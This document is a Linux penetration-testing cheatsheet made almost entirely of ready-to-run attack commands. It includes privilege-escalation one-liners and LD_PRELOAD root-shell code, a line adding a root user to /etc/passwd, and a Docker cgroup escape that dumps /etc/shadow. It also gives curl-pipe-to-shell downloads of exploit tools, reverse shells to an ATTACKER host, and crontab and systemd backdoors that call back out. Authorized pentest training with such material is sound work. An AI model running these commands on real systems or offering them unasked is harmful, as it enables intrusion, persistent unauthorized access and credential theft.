# Linux Penetration Testing Cheatsheet

## Initial Enumeration

```bash
# System info
uname -a && cat /etc/*release* && hostname && id && whoami
cat /proc/version
lscpu

# Users & groups
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group
lastlog | grep -v "Never"
w  # who is logged in

# Network
ip a && ip route && ss -tlnp
cat /etc/resolv.conf
arp -a
cat /etc/hosts

# Processes
ps auxfww
systemctl list-units --type=service --state=running

# Cron
crontab -l 2>/dev/null
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab
systemctl list-timers --all

# Environment
env && set
cat /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc ~/.bash_history 2>/dev/null
```

## Privilege Escalation — Automated

```bash
# LinPEAS (preferred)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# linux-exploit-suggester
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

# pspy — monitor processes without root
./pspy64
```

## SUID / SGID / Capabilities

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# GTFOBins exploitation patterns:
# python with cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# find with SUID:         find . -exec /bin/sh -p \;
# vim with SUID:          vim -c ':!/bin/sh'
# nmap (old):             nmap --interactive → !sh
# cp with SUID:           cp /etc/shadow /tmp/s && edit → cp /tmp/s /etc/shadow
# env with cap_setuid:    env /bin/sh -p
```

## Sudo Abuse

```bash
sudo -l  # check allowed commands

# Common exploits:
# sudo env → preserve env to hijack LD_PRELOAD
# (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/python3 → python3 -c 'import os; os.system("/bin/bash")'
# (ALL) NOPASSWD: /usr/bin/vim → vim -c ':!/bin/sh'
# (ALL) NOPASSWD: /usr/bin/less → less /etc/shadow → !sh
# (ALL) NOPASSWD: /usr/bin/awk → awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/perl → perl -e 'exec "/bin/sh"'
# (ALL, !root) NOPASSWD: → CVE-2019-14287: sudo -u#-1 /bin/bash

# LD_PRELOAD abuse (if env_keep+=LD_PRELOAD in sudoers)
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# Sudo token reuse (if ptrace is allowed)
# If another user's sudo session is active, ptrace can hijack it
```

## Writable Files / Directories

```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null

# Writable /etc/passwd → add root user
echo 'hacker:$(openssl passwd -6 password):0:0::/root:/bin/bash' >> /etc/passwd

# Writable /etc/shadow → crack or replace root hash
# Writable crontab files → inject reverse shell
# Writable systemd unit files → add ExecStartPre
# Writable PATH directories → binary hijacking
```

## PATH Hijacking

```bash
# Check PATH
echo $PATH

# If a cron/SUID/sudo binary calls a command without full path:
# 1. Find which relative command it calls
strings /usr/local/bin/target | grep -v "^/"
# 2. Create malicious binary in writable PATH dir
echo '#!/bin/bash' > /tmp/ps
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
# 3. Trigger the vulnerable binary
```

## Kernel Exploits

```bash
# Identify kernel version
uname -r

# Notable kernel exploits:
# 2.6.x    → Dirty COW (CVE-2016-5195)
# 4.4-4.13 → KASLR bypass + use-after-free
# 5.8+     → Dirty Pipe (CVE-2022-0847) — overwrite read-only files
# 5.x      → Polkit pkexec (CVE-2021-4034) — PwnKit
# 5.x      → nftables (CVE-2022-32250)
# 6.x      → GameOver(lay) (CVE-2023-2640, CVE-2023-32629) — Ubuntu OverlayFS

# PwnKit (pkexec):
curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

## Docker / Container Escape

```bash
# Am I in a container?
cat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "IN DOCKER"
ls -la /.dockerenv 2>/dev/null && echo "IN DOCKER"

# Docker socket available (instant root)
find / -name docker.sock 2>/dev/null
# If accessible:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container escape
# Check: cat /proc/self/status | grep CapEff → 0000003fffffffff = privileged
# Method 1: mount host filesystem
mkdir /tmp/host && mount /dev/sda1 /tmp/host
# Method 2: cgroup escape (notify_on_release)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/w/cgroup.procs"
```

## NFS Exploitation

```bash
# Check for NFS shares
showmount -e <target>
cat /etc/exports

# no_root_squash → write SUID binary from attacker
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash
# On target: /share/rootbash -p
```

## SSH Enumeration & Persistence

```bash
# Find SSH keys
find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# SSH agent forwarding hijack
ls -la /tmp/ssh-* 2>/dev/null
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX
ssh-add -l  # list forwarded keys

# Add persistence
echo "<your_pub_key>" >> ~/.ssh/authorized_keys
```

## Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# Socat (encrypted)
socat openssl-connect:ATTACKER:PORT,verify=0 exec:/bin/sh,pty,stderr,setsid

# Upgrade to fully interactive TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200
```

## File Transfer

```bash
# HTTP
python3 -m http.server 8080  # on attacker
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# Base64 (no network tools)
base64 -w0 file  # encode on source
echo "BASE64DATA" | base64 -d > file  # decode on target

# /dev/tcp (bash built-in)
cat < /dev/tcp/ATTACKER/PORT > /tmp/file
```

## Persistence Techniques

```bash
# Crontab backdoor
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/ATTACKER/PORT 0>&1") | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Monitor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service

# SUID backdoor
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden
# Execute: /tmp/.hidden -p
```

## Useful One-Liners

```bash
# Find all config files with passwords
grep -rli "password\|passwd\|pass\|secret\|key\|token\|api" /etc/ /opt/ /var/ /home/ 2>/dev/null

# Find recently modified files
find / -mmin -10 -type f 2>/dev/null | grep -v proc

# Find files with interesting extensions
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" -o -name "*.sql" -o -name "*.db" 2>/dev/null

# Check for database credentials
cat /var/www/html/wp-config.php 2>/dev/null
find / -name "*.php" -exec grep -l "mysql_connect\|mysqli\|PDO" {} \; 2>/dev/null

# Check internal services (for pivoting)
ss -tlnp | awk '{print $4}' | grep "127.0.0.1"
```
